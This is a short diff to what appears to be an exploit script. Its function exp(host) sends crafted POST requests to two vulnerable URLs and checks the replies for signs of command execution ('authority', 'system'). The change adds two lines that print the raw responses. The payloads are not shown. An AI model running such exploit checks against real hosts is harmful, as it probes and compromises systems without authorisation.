@@ -43,6 +43,8 @@ def exp(host):
         r1 =requests.post(vulurl1, headers=headers,data=str(raw1),timeout=15)
         r2 =requests.post(vulurl2, headers=headers,data=str(raw),timeout=15)
         if  "authority" in r1.text or "authority" in r2.text:
+            print(r1.text)
+            print(r2.text)
             if  "system" in r1.text:
                 print ("vulurl: "+vulurl1)
             else :
